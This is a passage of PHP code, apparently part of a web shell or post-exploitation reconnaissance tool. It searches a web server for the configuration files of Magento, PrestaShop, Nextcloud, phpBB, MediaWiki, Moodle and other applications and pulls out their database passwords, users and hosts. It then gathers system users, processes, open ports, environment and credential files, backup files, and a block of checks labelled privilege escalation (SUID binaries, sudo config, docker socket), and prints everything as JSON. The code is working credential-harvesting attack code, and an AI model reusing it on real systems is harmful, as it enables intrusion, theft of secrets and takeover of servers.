    if ($cp = $__fwFind('app/etc/env.php')) {
        $fw['config_path'] = $cp;
        $mc = @file_get_contents($cp, false, null, 0, 16384);
        if ($mc) {
            if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_name'] = $m[1];
            if (preg_match("/'username'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_user'] = $m[1];
            if (preg_match("/'password'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_pass'] = $m[1];
            if (preg_match("/'host'\\s*=>\\s*'([^']*)/", $mc, $m)) $fw['details']['db_host'] = $m[1];
        }
    }
    $frameworks[] = $fw;
}

// PrestaShop
if ($p = $__fwFind('config/settings.inc.php')) {
    $ver = $__fwReadVer($p, "/_PS_VERSION_.*?['\"]([\\d.]+)/");
    $fw = ['name' => 'PrestaShop', 'version' => $ver, 'config_path' => $p, 'details' => []];
    $psc = @file_get_contents($p, false, null, 0, 8192);
    if ($psc) {
        if (preg_match("/_DB_NAME_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_name'] = $m[1];
        if (preg_match("/_DB_USER_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_user'] = $m[1];
        if (preg_match("/_DB_PASSWD_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_pass'] = $m[1];
        if (preg_match("/_DB_SERVER_.*?['\"]([^'\"]+)/", $psc, $m)) $fw['details']['db_host'] = $m[1];
    }
    $frameworks[] = $fw;
}

// NextCloud / OwnCloud
if ($p = $__fwFind('version.php')) {
    $vc = @file_get_contents($p, false, null, 0, 4096);
    if ($vc && (stripos($vc, 'Nextcloud') !== false || stripos($vc, 'OwnCloud') !== false || preg_match('/\\$OC_/', $vc))) {
        $name = (stripos($vc, 'Nextcloud') !== false) ? 'Nextcloud' : 'OwnCloud';
        $ver = null;
        if (preg_match('/\\$OC_VersionString\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m)) $ver = $m[1];
        $fw = ['name' => $name, 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('config/config.php')) {
            $fw['config_path'] = $cp;
            $nc = @file_get_contents($cp, false, null, 0, 16384);
            if ($nc) {
                if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_name'] = $m[1];
                if (preg_match("/'dbuser'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_user'] = $m[1];
                if (preg_match("/'dbpassword'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_pass'] = $m[1];
                if (preg_match("/'dbhost'\\s*=>\\s*'([^']*)/", $nc, $m)) $fw['details']['db_host'] = $m[1];
            }
        }
        $frameworks[] = $fw;
    }
}

// phpBB
if ($p = $__fwFind('includes/constants.php')) {
    $ver = $__fwReadVer($p, "/PHPBB_VERSION.*?['\"]([\\d.]+)/");
    if ($ver) {
        $fw = ['name' => 'phpBB', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('config.php')) {
            $fw['config_path'] = $cp;
            $pc = @file_get_contents($cp, false, null, 0, 8192);
            if ($pc) {
                if (preg_match("/dbname.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_name'] = $m[1];
                if (preg_match("/dbuser.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_user'] = $m[1];
                if (preg_match("/dbpasswd.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_pass'] = $m[1];
                if (preg_match("/dbhost.*?['\"]([^'\"]+)/", $pc, $m)) $fw['details']['db_host'] = $m[1];
            }
        }
        $fw['details']['admin_path'] = '/adm/';
        $frameworks[] = $fw;
    }
}

// MediaWiki
if ($p = $__fwFind('includes/DefaultSettings.php')) {
    $ver = $__fwReadVer($p, "/\\$wgVersion\\s*=\\s*['\"]([^'\"]+)/");
    if ($ver) {
        $fw = ['name' => 'MediaWiki', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('LocalSettings.php')) {
            $fw['config_path'] = $cp;
            $mw = @file_get_contents($cp, false, null, 0, 16384);
            if ($mw) {
                if (preg_match("/\\$wgDBname\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_name'] = $m[1];
                if (preg_match("/\\$wgDBuser\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_user'] = $m[1];
                if (preg_match("/\\$wgDBpassword\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_pass'] = $m[1];
                if (preg_match("/\\$wgDBserver\\s*=\\s*['\"]([^'\"]+)/", $mw, $m)) $fw['details']['db_host'] = $m[1];
            }
        }
        $frameworks[] = $fw;
    }
}

// Moodle
if ($p = $__fwFind('version.php')) {
    $vc = @file_get_contents($p, false, null, 0, 4096);
    if ($vc && preg_match('/\\$release\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m) && stripos($m[1], 'Moodle') !== false) {
        $fw = ['name' => 'Moodle', 'version' => $m[1], 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('config.php')) {
            $fw['config_path'] = $cp;
            $mc = @file_get_contents($cp, false, null, 0, 8192);
            if ($mc) {
                if (preg_match("/\\$CFG->dbname\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_name'] = $m[1];
                if (preg_match("/\\$CFG->dbuser\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_user'] = $m[1];
                if (preg_match("/\\$CFG->dbpass\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_pass'] = $m[1];
                if (preg_match("/\\$CFG->dbhost\\s*=\\s*['\"]([^'\"]+)/", $mc, $m)) $fw['details']['db_host'] = $m[1];
            }
        }
        $frameworks[] = $fw;
    }
}

// CakePHP
if ($p = $__fwFind('vendor/cakephp/cakephp/VERSION.txt')) {
    $ver = trim(@file_get_contents($p, false, null, 0, 64) ?: '');
    $fw = ['name' => 'CakePHP', 'version' => $ver ?: null, 'config_path' => null, 'details' => []];
    if ($cp = $__fwFind('config/app_local.php')) $fw['config_path'] = $cp;
    elseif ($cp = $__fwFind('config/app.php')) $fw['config_path'] = $cp;
    $frameworks[] = $fw;
}

// Yii2
if ($p = $__fwFind('vendor/yiisoft/yii2/BaseYii.php')) {
    $ver = $__fwReadVer($p, "/getVersion[^}]*return\\s*['\"]([^'\"]+)/s");
    $fw = ['name' => 'Yii2', 'version' => $ver, 'config_path' => null, 'details' => []];
    $frameworks[] = $fw;
}

// --- Assemble response ---
$__diag = [
'php_version' => phpversion(),
'os' => php_uname(),
'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
'disable_functions' => ini_get('disable_functions') ?: 'none',
'open_basedir' => ini_get('open_basedir') ?: 'none',
'max_execution_time' => ini_get('max_execution_time') ?: '0',
'allow_url_fopen' => ini_get('allow_url_fopen'),
'sendmail_path' => ini_get('sendmail_path') ?: 'none',
'user' => get_current_user(),
'uid' => $uid,
'gid' => $gid,
'user_name' => $pwent['name'] ?? '?',
'group_name' => $grent['name'] ?? '?',
'groups' => implode(', ', $groupNames),
'cwd' => getcwd() ?: '?',
'disk_free' => @disk_free_space('.') ?: 0,
'disk_total' => @disk_total_space('.') ?: 0,
'functions' => $funcs,
'extensions' => $extList,
'passwd_users' => $passwdUsers,
'group_memberships' => $groupMemberships,
'processes' => $processes,
'container' => $container,
'arp_hosts' => $arpHosts,
'open_ports' => $openPorts,
'routes' => $routes,
'readable_files' => $readable,
'bin_dirs' => $binDirs,
'writable_dirs' => $writableDirs,
'all_binaries' => $allBinaries,
'interpreters' => $availInterpreters,
'tools' => $availTools,
'panels' => $detectedPanels,
'env_files' => $envContents,
// Privesc checks
'suid_binaries' => $suidBinaries,
'cron_jobs' => $cronJobs,
'sudo_config' => $sudoConfig,
'docker_socket' => $dockerSocket,
'mounts' => $mounts,
'capabilities' => $capabilities,
'kernel_info' => $kernelInfo,
'security_modules' => $securityModules,
'ld_preload' => $ldPreload,
'nfs_exports' => $nfsExports,
'systemd_timers' => $systemdTimers,
'credential_files' => $credentialFiles,
'backup_files' => $backupFiles,
'frameworks' => $frameworks,
];
$__jflags = (defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0) | (defined('JSON_PARTIAL_OUTPUT_ON_ERROR') ? JSON_PARTIAL_OUTPUT_ON_ERROR : 0);
$__out = json_encode($__diag, $__jflags);
if ($__out === false) $__out = json_encode(['error' => 'JSON encode failed: ' . json_last_error_msg()]);
echo $__out;
exit;
}
